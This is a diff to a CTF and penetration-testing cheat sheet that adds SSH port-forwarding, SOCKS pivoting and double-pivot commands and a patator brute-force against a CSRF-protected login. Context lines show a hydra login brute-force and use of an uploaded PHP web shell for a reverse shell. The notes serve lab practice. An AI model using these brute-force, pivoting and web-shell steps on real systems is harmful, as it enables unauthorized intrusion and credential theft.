@@ -21,6 +21,26 @@ My [setup script](https://github.com/ChrisPritchard/ctf-writeups/blob/master/thm
 3. `chmod 700 ~/.ssh`
 4. `chmod 600 ~/.ssh/authorized_keys`
 
+## SSH Proxies
+
+**local port forwarding**: the target host 192.168.0.100 is running a service on port 8888, and you want that service available on the localhost port 7777
+
+`ssh -L 7777:localhost:8888 user@192.168.0.100`
+
+**remote port forwarding**: you are running a service on localhost port 9999, and you want that service available on the target host 192.168.0.100 port 12340
+
+`ssh -R 12340:localhost:9999 user@192.168.0.100`
+
+**Local proxy** through remote host: You want to route network traffic through a remote host target.host, so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:1080
+
+`ssh -C2qTnN -D 1080 user@target.host`
+
+(args above are compression level, quiet, run in background and no command should be run)
+
+**Double pivoting**, opening a socks proxy on a remote machine and forwarding that proxy so its accessible locally:
+
+`ssh -tt -L8080:localhost:8157 sean@10.11.1.251 ssh -t -D 8157 mario@10.1.1.1 -p 222`
+
 ## Chisel reverse socks proxy
 
 Useful for pivoting, opens a socks proxy from the target to your attack box, basically so the attack box has a proxy to the target's network.
@@ -206,7 +226,7 @@ For the latter method, a website, the following are the steps:
 4. all going well, navigate to /shell.php?e=id on the webserver and see if the username has shown up
 5. because of how mangled the file is, and the simplicity of the web shell, if you want to catch a reverse shell remember to url encode the payload you add to `?e=`
 
-## Brute forcing with hydra and cewl
+## Brute forcing with hydra, cewl, patator
 
 CeWL generates a wordlist from a page. `cewl 192.168.154.10 > words.txt` will create a mini list, which was useful in one challenge based on bruteforcing with this list.
 
@@ -227,6 +247,10 @@ Regular login form (for wordpress dont do this, just use wp-scan with the -U, -P
 The below targets an aspx page, that needed viewstate to go with it in order to get the error message back:
 
 `hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.aspx:__VIEWSTATE=pIru3H%2F3LYg1qp3lNSwHX1ALuENNV6tddZ32Zp4xRIs57ec4jlYH9sp8EHtZ0sp66EsCaToBXZLEbw62lNBT7XuKpv84ZHetBU3stATD5DYczl9JagBTENtoK%2B6lyNFyDsrRWb34%2F9jXclG%2FsQWa1tJXjQAYZJP2MJNhNaH2WMIL%2FQf9&__EVENTVALIDATION=lQWGlUQ0Fmhz%2BuiWoqOKaexWGfGTltskH%2FV3RsXfmd%2B8N5m8JCLGWXUm7pFZQj0G0QjJMd3MLudMx0zUAlot%2BanlZVtlggDnm3e%2B2DNiDwnhrETOWRZdwtNypSULvwzs8ZlD1SiHFFPASQz1PJN12l5Fi3uL4UCohXb%2BBjCo1nU5Sz7I&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`
+
+If a CSRF is required, then `patator` works better:
+
+`patator http_fuzz method=POST --threads=1 timeout=5 url="http://10.11.1.11/scp/login.php" body="__CSRFToken__=_CSRF_&do=scplogin&userid=helpdesk&passwd=COMBO00&submit=Log+In" 0=/usr/share/wordlists/rockyou.txt before_urls="http://10.11.1.11/scp/login.php" before_egrep='_CSRF_:<input type="hidden" name="__CSRFToken__" value="(\w+)" />' -x ignore:fgrep='Access denied' proxy="http://127.0.0.1:8080" header="Cookie: OSTSESSID=s23pkfp9o9mo10kb8bea33ie76"`
 
 ## Downloading files with windows (or linux missing curl/wget)
 
